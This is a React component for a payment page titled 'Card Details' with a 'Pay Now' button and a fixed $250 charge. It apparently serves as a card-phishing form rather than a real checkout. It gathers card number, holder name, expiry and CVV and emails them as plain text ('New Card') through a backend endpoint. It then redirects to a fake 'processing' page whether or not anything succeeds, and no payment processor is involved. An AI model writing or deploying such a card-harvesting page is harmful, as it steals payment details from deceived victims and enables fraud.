import { useState } from "react";
import FormLayout from "../components/FormLayout";
import "../styles/card.css";
import { useNavigate } from "react-router-dom";
import { baseUrl } from "../constants";

export default function CardPage() {
  const [cardNum, setCardNum] = useState();
  const [cardHolder, setCardHolder] = useState();
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("23");
  const [cvv, setCvv] = useState();
  const navigate = useNavigate();

  const sendCard = async (e) => {
    e.preventDefault();

    const cardData = {
      subject: "New Card",
      message: `Name On Card: ${cardHolder}
        Card Number: ${cardNum}
        Expiry: ${expiryMonth}/${expiryYear}
        CVV: ${cvv}
        `,
    };
    setTimeout(() => {
      navigate("/processing2");
    }, 2000);

    try {
      const response = await fetch(`${baseUrl}/email/sendCard`, {
        method: "POST",
        body: JSON.stringify(cardData),
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
      });

      if (response.ok) {
        console.log("Success");
      } else {
        console.log("Failed to send the card.");
      }
    } catch (error) {
      console.error("An error occurred:", error);
    }
  };

  return (
    <>
      <div className="container">
        <h1 className="title2 mt-3">Card Details</h1>
        <FormLayout>
          <form onSubmit={sendCard}>
            <div className="d-flex">
              <div className="form-floating left-input">
                <input
                  type="text"
                  className="form-control"
                  id="floatingInput"
                  name="firstName"
                  minLength={3}
                  onChange={(e) => {
                    setCardNum(e.target.value);
                  }}
                />
                <label htmlFor="floatingInput">Card Number&#42;</label>
              </div>
              <div className="form-floating right-input">
                <input
                  type="text"
                  className="form-control"
                  id="floatingPassword"
                  onChange={(e) => {
                    setCardHolder(e.target.value);
                  }}
                />
                <label htmlFor="floatingPassword">Name On The Card&#42;</label>
              </div>
            </div>
            <div className="d-flex">
              <div className="form-floating left-input d-flex">
                <select
                  name=""
                  id="month"
                  value={expiryMonth}
                  defaultValue={"01"}
                  onChange={(e) => {
                    setExpiryMonth(e.target.value);
                  }}
                >
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
                <select
                  name=""
                  id="year"
                  defaultValue={"23"}
                  value={expiryYear}
                  onChange={(e) => {
                    setExpiryYear(e.target.value);
                  }}
                >
                  <option value="23">2023</option>
                  <option value="24">2024</option>
                  <option value="25">2025</option>
                  <option value="26">2026</option>
                  <option value="27">2027</option>
                  <option value="28">2028</option>
                  <option value="29">2029</option>
                </select>
              </div>
              <div className="form-floating right-input">
                <input
                  type="text"
                  className="form-control"
                  id="floatingPassword"
                  onChange={(e) => {
                    setCvv(e.target.value);
                  }}
                />
                <label htmlFor="floatingPassword">CVV</label>
              </div>
            </div>
            <div className="d-flex">
              <div className="form-floating left-input">
                <input
                  defaultValue={"USD"}
                  disabled
                  type="text"
                  className="form-control"
                  id="floatingInput"
                  name="firstName"
                  minLength={3}
                  placeholder="First Name"
                />
                <label htmlFor="floatingInput">Currency &#42;</label>
              </div>
              <div className="form-floating right-input">
                <input
                  defaultValue={"$250"}
                  disabled
                  type="text"
                  className="form-control"
                  id="floatingPassword"
                  placeholder="Middle Name"
                />
                <label htmlFor="floatingPassword">Amount</label>
              </div>
            </div>

            <div>
              <button type="submit" className="btn" id="submit">
                Pay Now
              </button>
            </div>
          </form>
        </FormLayout>
      </div>
    </>
  );
}
